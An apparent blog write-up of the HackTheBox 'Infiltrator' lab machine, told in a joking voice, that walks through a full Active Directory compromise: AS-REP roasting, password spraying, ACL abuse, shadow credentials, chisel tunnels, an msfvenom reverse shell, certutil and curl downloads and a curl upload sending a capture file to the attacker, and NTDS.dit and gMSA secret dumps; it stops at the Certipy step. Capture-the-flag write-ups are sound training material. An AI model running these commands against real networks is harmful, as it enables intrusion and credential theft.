---
title:  "Infiltrator (Insane)"
seo_title: "Writeup for the HackTheBox Infiltrator Machine"
date:   2025-08-01T21:01
categories: ['HackTheBox', 'Windows', 'Active-Directory']
---

![](/assets/images/headers/Infiltrator.png)

# Synopsis
Infiltrator is an Insane Windows Active Directory machine that starts with a website that an attacker can scrape for possible usernames on the machine. One user doesn't have Kerberos pre-authentication enabled, and his password can be cracked. Afterwards, an intricate attack chain focused on Active Directory permissions allows the attacker to get access to the machine over WinRM as the user `M.harris`. Once on the machine, the attacker can identify that the whole company communicates through the `Output Messenger` application. Infiltrating the application, switching users, reverse engineering a binary, and using the application's API, he can eventually land a shell as the user `O.martinez` on the remote machine. Afterwards, he discovers a network capture file with a backup archive and a BitLocker volume recovery key. Unlocking the volume, another backup folder contains an `ntds.dit` file from which he can read sensitive user information and find a valid password for the user `lan_managment`. This new user can read the GMSA password of the user `infiltrator_svc$`. This last user can exploit a vulnerable ESC4 certificate template. Finally, he can get the Administrator's hash and compromise the whole domain through the certificate exploitation.

## Enumeration
I ain’t wastin' time with your granddaddy’s nmap scan — nah, we already know this box be bustin’ that Active Directory life, so we skip the foreplay and go raw into **user enumeration**. First, we rip a list of names straight off the company site like it’s LinkedIn recon but with zero professionalism and maximum goblin energy (we be lootin').

```
David Anderson
Olivia Martinez
Kevin Turner
Amanda Walker
Marcus Harris
Lauren Clark
Ethan Rodriguez
```

Now we feed these names into `UsernameAnarchy` — a beautiful little gremlin of a tool that chews on names and vomits out 6,000 permutations of corporate identity theft.

```console
$ /username-anarchy/username-anarchy --input-file users.txt > probably_usernames.txt
```

And just like that, we got a whole buffet of usernames. Next up: **Kerbrute**, because what’s more fun than whispering sweet nothings to Kerberos and seeing who moans back?

```console
$ kerbrute userenum -d INFILTRATOR.HTB --dc 10.10.11.31 probably_usernames.txt -o valid_users
    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 09/01/24 - Ronnie Flathers @ropnop

2024/09/01 09:45:32 >  Using KDC(s):
2024/09/01 09:45:32 >  10.10.11.31:88

2024/09/01 09:45:33 >  [+] VALID USERNAME:	 d.anderson@INFILTRATOR.HTB
2024/09/01 09:45:33 >  [+] VALID USERNAME:	 o.martinez@INFILTRATOR.HTB
2024/09/01 09:45:33 >  [+] VALID USERNAME:	 k.turner@INFILTRATOR.HTB
2024/09/01 09:45:33 >  [+] VALID USERNAME:	 a.walker@INFILTRATOR.HTB
2024/09/01 09:45:33 >  [+] VALID USERNAME:	 m.harris@INFILTRATOR.HTB
2024/09/01 09:45:33 >  [+] VALID USERNAME:	 e.rodriguez@INFILTRATOR.HTB
2024/09/01 09:45:33 >  [+] VALID USERNAME:	 l.clark@INFILTRATOR.HTB
```

Alright, we cracked the username code, and yeah, we could spam it with name lists like a desperate Tinder bot, but tossing in `j.smith-x98800.txt` was a total flop. So, we’re calling it: this is our final crew.

```
administrator@INFILTRATOR.HTB
d.anderson@INFILTRATOR.HTB
o.martinez@INFILTRATOR.HTB
k.turner@INFILTRATOR.HTB
a.walker@INFILTRATOR.HTB
m.harris@INFILTRATOR.HTB
e.rodriguez@INFILTRATOR.HTB
l.clark@INFILTRATOR.HTB
```

Time to get greasy with **ASREPRoasting**. We send a lil’ love letter to the domain like “hey, gimme them sweet sweet hashies” — and boom, one account responds like “sure babe, no pre-auth needed!”. Yessir!

```console
$ GetNPUsers.py INFILTRATOR.HTB/ -dc-ip 10.10.11.31 -no-pass -usersfile all_ad_users -format hashcat
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User administrator@INFILTRATOR.HTB doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User d.anderson@INFILTRATOR.HTB doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User o.martinez@INFILTRATOR.HTB doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User k.turner@INFILTRATOR.HTB doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a.walker@INFILTRATOR.HTB doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User m.harris@INFILTRATOR.HTB doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User e.rodriguez@INFILTRATOR.HTB doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$l.clark@INFILTRATOR.HTB@INFILTRATOR.HTB:96becffa85728f8fea33be18e9ca6164$bb2614f154c83cbcd98e1f110566be9d1ea1bd44eb7041f119b22b73bbb82175e9e7b309f518c4dab0469efcb47e15a332caf0e00f82a55ad45afed64a8b923afc1f832664f1f6eba19414e6b706933d3c27a656688f59e748ba7ca64e68647bbf113d67afe8d39d39db2ae9f8bb28383bc42f48a22969d34a21599c40d1bd240a92185222100a9787ddaaa78660197a21affdccb023e9114b51797693a6a37cfc72ac9dc300b08f9bc89a9d64c522c00a3262d67b54f34d24efdb74ad9bceae2cbaa2631c4d595162f46a7c0dcbc8607e77c71986e2a435def66cfd5a3de16aee5074dfdba977dd8d037083c189d523862e
```

Turns out our girl **l.clark** out here just raw-dogging Kerberos with no protection. Naturally, we hit her with the ol’ **hashcat special**:

```console
$ hashcat -m 18200 lclark.hash $ROCKYOU
```

This hash be cracking faster than a microwave burrito — and what do we get? That’s right, keys to the kingdom. VIP access. L.clark got us in the door, and now we’re poking around like we own the place.

```console
$ nxc smb dc01.infiltrator.htb -u 'l.clark' -p 'WAT?watismypass!' --users
SMB         10.10.11.31   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31   445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass!
```

With these creds on our hands, we blast `nxc smb` again and go full snoop-mode on the domain — enumerate all the users like it’s roll call at hacker high school. We also run a cheeky lil' SID lookup:

```console
$ lookupsid.py l.clark@INFILTRATOR.HTB | grep SidTypeUser
Password: WAT?watismypass!
500: INFILTRATOR\Administrator (SidTypeUser)
501: INFILTRATOR\Guest (SidTypeUser)
502: INFILTRATOR\krbtgt (SidTypeUser)
1000: INFILTRATOR\DC01$ (SidTypeUser)
1103: INFILTRATOR\D.anderson (SidTypeUser)
1104: INFILTRATOR\L.clark (SidTypeUser)
1105: INFILTRATOR\M.harris (SidTypeUser)
1106: INFILTRATOR\O.martinez (SidTypeUser)
1107: INFILTRATOR\A.walker (SidTypeUser)
1108: INFILTRATOR\K.turner (SidTypeUser)
1109: INFILTRATOR\E.rodriguez (SidTypeUser)
1601: INFILTRATOR\winrm_svc (SidTypeUser)
3102: INFILTRATOR\infiltrator_svc$ (SidTypeUser)
```

We flex for a **Kerberoasting** round just in case someone slipped, but nah, nothing juicy. No tickets, no service accounts, just disappointment. But hold up — plot twist. Our recon pulls up a lil’ easter egg: **user k.turner** has a password just chillin’ in their description field. Man’s out here treating Active Directory like a Post-it note.

```console
$ nxc smb dc01.infiltrator.htb -u 'l.clark' -p 'WAT?watismypass!' --users | grep K.turner
SMB                      10.10.11.31   445    DC01             K.turner                      2024-02-25 15:40:35 1       MessengerApp@Pass!
```

So we take this blessed gift from k.turner’s description field and we **yeet** it into a password spray like we’re Oprah handing out creds:

> _“You get a login! YOU get a login! ERRBODY LOGGING IN!”_

```console
$ nxc smb dc01.infiltrator.htb -u users.txt -p 'MessengerApp@Pass!' --continue-on-success
SMB         10.10.11.31   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31   445    DC01             [-] infiltrator.htb\k.turner:MessengerApp@Pass! STATUS_LOGON_FAILURE
SMB         10.10.11.31   445    DC01             [-] infiltrator.htb\d.anderson:MessengerApp@Pass! STATUS_LOGON_FAILURE
```

But then... Curveball. We see that both `m.harris` and `d.anderson` get the message `STATUS_ACCOUNT_RESTRICTION`. Excuse me??? Microsoft really out here like:

> “Woah woah woah, hold up... you _do_ have the right password, but uhh... no entry. Try again when your chakras are aligned or whatever.” 

This ain't a wrong password, nah. This is **“you got it, but you still ain't allowed.”** That’s the cyber equivalent of your key working in the lock but some dude inside just holding the door shut whispering, _“not today, boi.”_

So yeah — creds probably valid, but maybe they’re disabled, locked out, got logon restrictions, or just spiritually unavailable. Either way, these accounts are on some ✨emotional boundary✨ arc and we gotta pivot.

### Bloodhound
So now that we got creds for `l.clark` (shoutout to my boy k.turner), we unleash **BloodHound** to sniff out the domain like a digital truffle pig.

```console
$ docker run -v ${PWD}:/bloodhound-data -it bloodhound
$ bloodhound-python -u 'l.clark' -p 'WAT?watismypass!' -ns 10.10.11.31 -d infiltrator.htb --zip -c All
```

We throw that juicy ZIP into BloodHound-CE like it’s an offering to the graph gods — and lo and behold, our good sis `l.clark` is chillin’ with the **Marketing Team**. Nothing too spicy yet, but wait... The Chiefs Marketing group has the `ForceChangePassword` on the user `M.Harris`. That's a bingo!

Meanwhile, `d.anderson` still out here on that **NTLM ain’t my vibe** energy — he’s vibing strictly in **Kerberos-only** mode. Man's spiritually allergic to NTLM. But lucky for us, we speak fluent Kerberos. So we flex with `getTGT.py`, praying to the Impacket gods for a valid TGT:

```console
$ getTGT.py 'infiltrator.htb/d.anderson:WAT?watismypass!' -dc-ip 10.10.11.31
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Saving ticket in d.anderson.ccache
```

And BOOM — it worked. Password valid. Ticket secured. Identity stolen. Heist soundtrack intensifies. Then we casually log in like we’ve been `d.anderson` this whole time:

```console
$ nxc smb infiltrator.htb -d infiltrator.htb -u 'd.anderson' -p 'WAT?watismypass!' -k
```

But hold up... BloodHound whispers in our ear again: **“psst... `d.anderson` got `GenericAll` over the Marketing Digital OU...”**

![](/assets/images/writeups/infiltrator/BH-Anderson.png)

Okay now we’re cooking. You know what that means? We can start **yeeting ACLs** around ike we’re modding the Minecraft server at 3AM.

> “You get admin perms, you get admin perms—oh look, the economy’s ruined!”

So we bless our old pal `l.clark` with **GenericAll** over the entire OU using `bloodyAD`:

```console
$ bloodyAD --host dc01.infiltrator.htb -d infiltrator.htb -k add genericAll 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' 'l.clark'
[+] l.clark has now GenericAll on OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB
```

That’s it, **l.clark just went from running marketing reports to rewriting destiny.** Let the ACL shenanigans commence.

## User
Now that we’ve yeeted `GenericAll` onto the OU like it’s a cursed enchantment, our permissions have **trickled down** to lil’ `e.rodriguez` too. BloodHound’s over here grinning like:

> “Congrats, you just unlocked the side quest to **`m.harris`**.”

![](/assets/images/writeups/infiltrator/BH-Clark-to-Harris.png)

So how do we get spicy with this? We’re about to hit `e.rodriguez` with **Shadow Credentials**—basically stuffing a fake cert into his account like it’s a USB Rubber Ducky in a coffee shop laptop.

```console
$ bloodyAD --host dc01.infiltrator.htb -d infiltrator.htb -u 'l.clark' -p 'WAT?watismypass!' add shadowCredentials 'e.rodriguez'
[+] KeyCredential generated with following sha256 of RSA key: 21db2d646e4fd3177d1c18717161109ed382cae2e6ed5529cf1589e41a38ad3c
No outfile path was provided. The certificate(s) will be stored with the filename: LN43uoBF
[+] Saved PEM certificate at path: LN43uoBF_cert.pem
[+] Saved PEM private key at path: LN43uoBF_priv.pem
A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
Run the following command to obtain a TGT:
python3 PKINITtools/gettgtpkinit.py -cert-pem LN43uoBF_cert.pem -key-pem LN43uoBF_priv.pem infiltrator.htb/e.rodriguez LN43uoBF.ccache
```

This lets us **Pass the Certificate** using PKINIT, snag a TGT, and suddenly we’re `e.rodriguez` now. It’s like Face/Off but for Active Directory. Kerberos never saw it coming.

```console
$ python3 PKINITtools/gettgtpkinit.py -cert-pem LN43uoBF_cert.pem -key-pem LN43uoBF_priv.pem infiltrator.htb/e.rodriguez LN43uoBF.ccache
2024-09-01 12:36:01,801 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2024-09-01 12:36:01,812 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2024-09-01 12:36:24,016 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2024-09-01 12:36:24,016 minikerberos INFO     35baa0aa822a3ef8d83996e27d41606658fd9f2a836639d7b8ed7c1f95b7a678
INFO:minikerberos:35baa0aa822a3ef8d83996e27d41606658fd9f2a836639d7b8ed7c1f95b7a678
2024-09-01 12:36:24,028 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

Having obtained the TGT, we can conduct an UnPAC-the-hash to recover the NT hash of the target account.

```console
$ export KRB5CCNAME=LN43uoBF.ccache
$ python3 PKINITtools/getnthash.py infiltrator.htb/e.rodriguez -key 35baa0aa822a3ef8d83996e27d41606658fd9f2a836639d7b8ed7c1f95b7a678 -dc-ip 10.129.149.83
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Using TGT from cache
Recovered NT Hash
b02e97f2fdb5c3d36f77375383449e56
```

Boom, we just snagged the NT Hash of `e.rodriguez` like a digital pickpocket in a hacker’s convention. Now it’s time to boss up and slap this user into the **CHIEFS MARKETING** group — because who doesn’t wanna be a marketing chief.

While we’re at it, we’re gonna _force_ poor `m.harris` to change their password faster than you ghost your ex. But first, don’t forget to pimp out your `/etc/krb5.conf` file with the right settings or Kerberos will just laugh at you like you showed up to a sword fight with a butter knife.

```
[libdefaults]
        default_realm = INFILTRATOR.HTB

[realms]
        INFILTRATOR.HTB = {
                kdc = dc01.infiltrator.htb
                admin_server = dc01.infiltrator.htb
        }

[domain_realm]
        .infiltrator.htb = INFILTRATOR.HTB
        infiltrator.htb = INFILTRATOR.HTB

[logging]
#       kdc = CONSOLE
```

If you are not a scrub like me, you could have just generated this with `nxc`.

```console
$ nxc smb infiltrator.htb --generate-krb5-file krb5.conf
```

Now we add ourself to the target group and force a password change.

```console
$ bloodyAD --host 10.10.11.31 -d infiltrator.htb -u "e.rodriguez" -p ':b02e97f2fdb5c3d36f77375383449e56' add groupMember 'CHIEFS MARKETING' 'e.rodriguez'
[+] e.rodriguez added to CHIEFS MARKETING

$ bloodyAD --host 10.10.11.31 -d infiltrator.htb -u "e.rodriguez" -p ':b02e97f2fdb5c3d36f77375383449e56' set password 'm.harris' 'Pwn3d_by_ACLs!'
```

Since `m.harris` is playing the _protected user_ card like he the president of Active Directory, we gotta do the whole “request a TGT and flex Kerberos auth” dance again.  

No password? No problem — just slide into Evil-WinRM using the magic `--realm` flag with your shiny ticket instead of a boring old password. It’s like showing up to the party with a golden invite while everyone else is stuck outside sweating their creds.

```console
$ getTGT.py 'infiltrator.htb/m.harris:NewP@ssword2024' -dc-ip 10.10.11.31
[*] Saving ticket in m.harris.ccache

$ export KRB5CCNAME=m.harris.ccache
$ evil-winrm -i dc01.infiltrator.htb -u 'm.harris' --realm INFILTRATOR.HTB 
```

## Root
After logging in, we find a few zip files in `C:\ProgramData\Output Messenger Server\Temp>`. Inside the `OutputMessengerMysql.zip` we find a `OutputMysql.ini` that contains a password for port 14406.

```
$ cat OutputMysql.ini
[SETTINGS]
SQLPort=14406
Version=1.0.0

[DBCONFIG]
DBUsername=root
DBPassword=ibWijteig5
DBName=outputwall

[PATHCONFIG]
;mysql5.6.17
MySQL=mysql
Log=log
def_conf=settings
MySQL_data=data
Backup=backup
```

### Unintended Path
Since the database is running with admin powers like it’s the kingpin of this system, we just casually port-forward that juicy MySQL on port 14406 and grab the root flag like a boss.  
Dropped Chisel on the target because who doesn’t love a good reverse tunnel flex?

```console
$ ./chisel server --reverse
PS C:\> .\chisel.exe client 10.10.14.14:8080 R:8090:127.0.0.1:14406

$ mysql -u root -p'ibWijteig5' -P 8090 --ssl=off
MariaDB [outputwall]> use outputwall;
MariaDB [outputwall]> select LOAD_FILE("C:/Users/Administrator/Desktop/root.txt");
```

Easy mode activated — root flag, served on a silver platter. Now buckle up, because it’s time to dive into the _actual_ intended way to get root. Spoiler: it’s not this chill.

### Intended Path (Windows Client needed)
From here on out, we’re hopping into a Windows VM because… well, reasons. Spoiler alert: it gets messy and way more fun. If you still have the TGT ticket for `m.harris` chilling somewhere, just yank it over and convert to a Kirbi file like a pro hacker. But nah, I’m gonna show you how to climb back up from `e.rodriguez` to `m.harris` — Windows style.

!!!warning
If you get hit with that annoying `KRB_AP_ERR_SKEW (Clock skew too great)` error, it means your VM clock is throwing a tantrum and isn’t synced with the domain controller. Fix that _before_ joining the domain — otherwise you’re in for a world of pain and might need to do a time travel rollback.
!!!

First we will download the `bloodAD.exe` compiled binary and run the following commands:

```console
PS C:\> C:\Tools\bloodyAD.exe --host 10.10.11.31 -d infiltrator.htb -u 'e.rodriguez' -p ':b02e97f2fdb5c3d36f77375383449e56' add groupMember 'CHIEFS MARKETING' 'e.rodriguez'
[+] e.rodriguez added to CHIEFS MARKETING

PS C:\> C:\Tools\bloodyAD.exe --host 10.10.11.31 -d infiltrator.htb -u 'e.rodriguez' -p ':b02e97f2fdb5c3d36f77375383449e56' set password 'm.harris' 'Pwn3d_by_ACLs!'
[+] Password changed successfully!

PS C:\> python C:\Tools\Python\getTGT.py 'infiltrator.htb/m.harris:Pwn3d_by_ACLs!' -dc-ip 10.10.11.31
[*] Saving ticket in m.harris.ccache
```

Next up, before Kerberos can party on our Windows attack VM, we gotta join it to the domain.  Hop into: `Settings > Accounts > Access work or school > Connect`. Punch in `infiltrator.htb` as the domain and log in with any domain account (e.g. `l.clark`).

Another pro tip: Make sure your VPN interface’s DHCP server points to the DC IP (10.10.11.31), otherwise Kerberos throws a hissy fit. 

If it asks to add an account, just politely decline. Restart your VM, sign in as a **local user**, and don’t forget to slap that firewall off — this isn’t a hotel lobby.

![](/assets/images/writeups/infiltrator/Join-AD.png)

Next we can convert the `ccache` file to Kirbi and inject our ticket into memory using Rubeus.

```powershell
PS C:\> python C:\Tools\Python\ticketConverter.py .\m.harris.ccache m.harris.kirbi
[*] converting ccache to kirbi...
[+] done

PS C:\> C:\Tools\Rubeus.exe ptt /ticket:m.harris.kirbi
```

Aight we’re in. Since `m.harris` got that sweet Remote Management privilege, we Kerberos-yeet ourselves into a WinRM shell like some kind of enterprise wizard. Once inside, it’s business as usual: HTTP server up, chisel in hand, and we're tunneling like it’s 1999.

```powershell
PS C:\> python -m http.server
PS C:\> winrm set winrm/config/client '@{TrustedHosts="*"}'
PS C:\> Enter-PSSession -ComputerName dc01.infiltrator.htb -Authentication Kerberos
[dc01.infiltrator.htb]: PS C:\Users\M.harris\Documents> certutil -f -urlcache http://10.10.14.7:8000/chisel.exe C:\Windows\Temp\chisel.exe
```

Drop the chisel. Tunnel the ports. Talk to the DB like a boss.

```powershell
PS C:\> C:\Tools\chisel.exe server --reverse
[dc01.infiltrator.htb]: PS C:\Windows\Temp> .\chisel.exe client 10.10.14.7:8080 R:14121:127.0.0.1:14406
```

Inside the `ot_wall_posts`, we uncover some juicy lore straight from the dev diaries:

```
Hey team, I\'m here! In this screenshot, I\'ll guide you through using the app UserExplorer.exe. It works seamlessly with dev credentials, but remember, it\'s versatile and functions with any credentials. Currently, we\'re exploring the default option. Stay tuned for more updates!\n\n\"UserExplorer.exe -u m.harris -p D3v3l0p3r_Pass@1337! -s M.harris

Hey team,\n\nWe\'ve identified a security concern: some users and our domain (dc01.infiltrator.htb) have pre-authentication disabled on kerberos. \nNo need to panic! Our vigilant team is already on it and will work diligently to fix this. In the meantime, stay vigilant and be cautious about any potential security risks
```

![](/assets/images/writeups/infiltrator/OM-OT-wall.png)


Thanks for the creds, mystery dev. Now, according to OutputMessenger’s official docs (yes, we actually read those), the app needs a buffet of ports open to do its thing. Let’s open the floodgates:

```powershell
PS C:\> Invoke-Command -ScriptBlock { C:\Windows\Temp\chisel.exe client 10.10.14.7:8080 R:14121:127.0.0.1:14121 R:14122:127.0.0.1:14122 R:14123:127.0.0.1:14123 R:14124:127.0.0.1:14124 } -Session $Session

2024/09/06 07:22:02 client: Connected (Latency 523.4µs)
```

We can now get access to OutputMessenger on `http://localhost:14123` with the credentials from the posts. In the `Dev_Chat` they talk about the `UserExplorer.exe`, also the Admin said the following:

```
Hello everyone 😃
There have been some complaints regarding the stability of the "Output Messenger" application. In case you encounter any issues, please make sure you are using a Windows client. The Linux version is outdated.
```

Translation: “Linux users? Sorry babes, go get a real OS.”

So yeah, looks like we’re installing the Windows client if we want this app to actually function. Time to bootleg some enterprise nostalgia.

#### OutputMessenger Windows Client
So we spin up the Windows OutputMessenger client (don’t ask how we still trust this thing), login as our dev-king `m.harris` using the creds from the earlier DB leak: `D3v3l0p3r_Pass@1337!`

![](/assets/images/writeups/infiltrator/OM-login-win-client.png)

Now that we’re inside, we peek into the dev chat and snatch a copy of `UserExplorer.exe`. Because apparently in this workplace, sensitive tools are passed around in chat messages like memes.

![](/assets/images/writeups/infiltrator/OM-UserExplorer.png)

Naturally, we drop this mystery EXE into **dnSpy**, crack it open, and bingo — inside the `LdapApp` class is the hardcoded equivalent of a security red flag:

![](/assets/images/writeups/infiltrator/OM-UserExplorer-password.png)

```
string text4 = "winrm_svc";
string cipherText = "TGlu22oo8GIHRkJBBpZ1nQ/x6l36MVj3Ukv4Hw86qGE=";
text2 = Decryptor.DecryptString("b14ca5898a4e4133bbce2ea2315a1916", cipherText)
```

So here’s the tea:
- Username is `winrm_svc`
- Encrypted password is stored as a Base64 blob
- Decryption key is hardcoded
- IV is literally all zeroes (because who needs cryptographic hygiene anyway)

The `DecryptString` function just base64-decodes the ciphertext, then runs AES-CBC using that key and the null IV. Easy bake oven level decryption. We can decrypt this with the following Python script:

```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
import base64

def decrypt_string(key: str, cipher_text: str) -> str:
    key_bytes = key.encode('utf-8')
    cipher_bytes = base64.b64decode(cipher_text)

    if len(key_bytes) not in {16, 24, 32}:
        raise ValueError("Key must be 16, 24, or 32 bytes long")

    cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(b'\x00' * 16), backend=default_backend())
    decryptor = cipher.decryptor()

    decrypted_bytes = decryptor.update(cipher_bytes) + decryptor.finalize()

    return decrypted_bytes.decode('utf-8')

key = 'b14ca5898a4e4133bbce2ea2315a1916'
cipher_text = 'TGlu22oo8GIHRkJBBpZ1nQ/x6l36MVj3Ukv4Hw86qGE='

print(decrypt_string(key,decrypt_string(key, cipher_text)))
```

We recover the password as `WinRm@$svc^!^P`. Now we can also WinRM with this user, which saves us some headaches of resetting passwords and grabbing TGTs.

```powershell
PS C:\> $SecPassword = ConvertTo-SecureString 'WinRm@$svc^!^P' -AsPlainText -Force
PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('infiltrator.htb\winrm_svc', $SecPassword)
PS C:\> Enter-PSSession -Computername 10.10.11.31 -Authentication Negotiate -Credential $Cred
```

We can also login to Output Messenger as this user and find a spicy little post from **Martinez**, casually admitting he dropped his password in the **Chiefs_Marketing_chat** room like it's just another Tuesday. The `winrm_svc` account also has a note with the `lan_management` api key.

![](/assets/images/writeups/infiltrator/OM-API-key.png)

```
lan_management api key 558R501T5I6024Y8JV3B7KOUN1A518GG
```

Now we can proceed to see what we can do with the API key. Reading the docs of OM, this is one of the request that can be made.

```http
Request Headers: 
GET /api/chatrooms/[ROOM]
Accept: application/json, text/javascript, */*;  
API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG 
Host: infiltrator.htb:14125
```

Therefore we also need to forward port 14125 and send the following request.

```powershell
PS C:\> curl.exe -H 'Accept: application/json, text/javascript, */*;' -H 'API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' -H 'Host: infiltrator.htb:14125' http://localhost:14125/api/chatrooms/Chiefs_Marketing_chat

{"row":{"room":"Chiefs_Marketing_chat","roomusers":"A.walker|0,O.martinez|0"},"success":true}
```
 
Alright, we indeed see that Martinez is part of this chat room. In order to read the chat logs, we need to also find the `roomkey` according to the docs. We have to start looking for this on the DC. We log in as `winrm_svc` and find an `OM.db3` file in the `AppData` folder of this user. We download it and open it with a database viewer. In one of the tables we find the key.

![](/assets/images/writeups/infiltrator/OM-room-key.png)

Now we can attempt to read the logs by specifying a date range.

```powershell
PS C:\> curl.exe -H 'Accept: application/json, text/javascript, */*;' -H 'API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' -H 'Host: localhost:14125' 'http://localhost:14125/api/chatrooms/logs?roomkey=20240220014618@conference.com&fromdate=2024/02/01&todate=2024/03/01'
```

At the bottom, we find the credentials for `o.martinez`.

```
o.martinez:m@rtinez@1996!
```

Unfortunately, these are not domain credentials but we can still login to the OM client again. The message with `winrm_svc` also mentioned the following:

``` 
I'm getting random website pop-ups on my desktop every day at 09:00 AM. I suspect there's an issue with the app
```

So martinez been cryin in the club (OM chat) like "wahh my desktop opening random websites at 9AM 😭". Bro. you fr just told me you got **task scheduler malware edition** installed and running.

From the application, there is a feature to run programs and open website on a designated time. When we try this out and for instance just launch the default browser application, it indeed opens on the local machine. Just a spicy lil feature called **"Scheduled Events"**, which basically goes:
> “hey, wanna open calc.exe on ur coworker's PC at 3am? go for it.”

I also noticed that Martinez always is in the idle state so maybe we can upload a reverse shell to the DC and execute it in the context of Martinez. Let's try! Metasploit payload goes brrr...

```console
$ msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.7 lport=443 -f exe -o payload.exe

[10.10.11.31]: PS C:\Windows\Temp> curl.exe http://10.10.14.7:8000/payload.exe -o payload.exe

PS C:\> C:\Tools\nc64.exe -nlvp 443
```

Now I create a new event with a nearby time, logout and login as `k.turner` with pass `MessengerApp@Pass!` and wait. You also need to have the same binary in your local machine in order to create the event. Just make sure martinez stays online. If not? Cry harder, reset the box, and try again. Eventually you will get a shell bro.

!!!info
At this point you can switch back to a Linux VM or continue on Windows if you prefer ;)
!!!

#### PCAP Analysis and BitLocker Decrypt
So we pokin’ around in Martinez’s AppData, and guess what man’s got tucked away in the digital sock drawer? A juicy lil `.pcapng` file sittin’ there like it didn’t just witness a whole cybercrime. File’s named `network_capture_2024.pcapng`—real subtle. Naturally, we snatch it. Set up a quick n’ dirty Python upload server on our end, then slap that file across the internet like we’re trading bootleg mixtapes.

```console
$ python -m uploadserver
PS C:\Users\O.martinez\AppData> curl.exe http://10.10.14.7:8000/upload -F "files=@network_capture_2024.pcapng" -f "token=helloworld"
```

Now inside the capture, we dig up two little digital treasures:
1. A sketchy-looking file labeled `BitLocker-backup.7z` (because encrypting your own encryption is totally normal, right?)
2. A cleartext password floating inside an API call: `M@rtinez_P@ssw0rd!` dropped casually in a `change_auth_token` request. Like bro, you good?

Armed with the creds, we RDP into Martinez’s box. Like legally? No. But efficiently? Absolutely. Anyway, this zip file’s got a password on it. Of course it does. But we ain’t scared of some password-protected nonsense. We hit it with that `zip2john` → `hashcat` combo and let RockYou do what RockYou does best.

```console
$ zip2john BitLocker-backup.7z > bitlocker.hash
$ hashcat bitlocker.hash $ROCKYOU
```

Password? Man, it’s just `zipper`. Truly the creativity is off the charts. Inside? The BitLocker recovery key. That’s like finding the keys to someone’s panic room inside their junk drawer.

![](/assets/images/writeups/infiltrator/Bitlocker-Key.png)

We use that shiny new key to unlock the drive like we’re defusing a bomb in a B-movie, and what do we find?

Oh, just a full Windows Server 2012 backup sittin’ in the Documents folder of `Administrator`. You know, just casual enterprise-grade secrets lying around like loose change. And inside that backup? The crown jewel: `NTDS.dit` and the registry hives. Time to fire up `ntdsdotsqlite`, turn that chunky binary blob into an actual database we can poke at like the gremlins we are:

```console
$ ntdsdotsqlite NTDS.DIT --system SYSTEM -o NTDS.sqlite

sqlite3 NTDS.sqlite
sqlite> select description from user_accounts;
Built-in account for administering the computer/domain
Built-in account for guest access to the computer/domain
Key Distribution Center Service Account
User Security and Management Specialist
l@n_M@an!1331
Head of Development Department
```

We found the password for the `lan_management` account.

```console
$ nxc smb 10.10.11.31 -u 'lan_managment' -p 'l@n_M@an!1331' -d infiltrator.htb
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\lan_managment:l@n_M@an!1331
```

#### Bloodhound LAN_MANAGMENT to INFILTRATOR_SVC
So now that we deep in this bish, rootin' around like cyber raccoons, we stumble on a shiny lil gem: the gMSA password for `infiltrator_svc$`. Yeah, you heard me—**group managed service account** type beat. The kind of account that's like, “I rotate my password so you can’t get me,” but guess what? We got you, bozo.

![](/assets/images/writeups/infiltrator/BH-LAN.png)

We ain't talking basic creds here—this is like finding the keys to a vending machine **and** the cash drawer **and** the building it's in. You ever seen Windows hand out secrets like this? This is that _you-left-your-safe-open-and-taped-the-combo-to-it_ energy.

How we do it? We just whisper real nice to AD, and it hands us the whole encrypted blob like:

> “Hey king, here's the service account's whole-ass credential. Don't spend it all in one Kerberos.”

```console
$ python gMSADumper.py -u 'lan_managment' -p 'l@n_M@an!1331' -d infiltrator.htb
Users or groups who can read password for infiltrator_svc$:
 > lan_managment
infiltrator_svc$:::9ae7de37439f359608eccf2cff5d32b9
infiltrator_svc$:aes256-cts-hmac-sha1-96:efa1fa0fcbe57177f6f89d8513d16cbbb673ed8b85a137e5eb06baefdd3c0d27
infiltrator_svc$:aes128-cts-hmac-sha1-96:4d556ec8ebc73e358d05430c7696f1f0
```

One quick decrypt later and boom: password’s sittin’ in plaintext like it paid rent. Now `infiltrator_svc$` is ours to command. And with a gMSA under your belt? Bro, you’re not just in the network. **You are** the network.

Let’s cook.

#### Certipy

We back on the grind and it’s time to hunt some **ADCS** sauce. Fire up that **Certipy** like it’s a radar gun pointed straight at Microsoft’s feelings.

```console
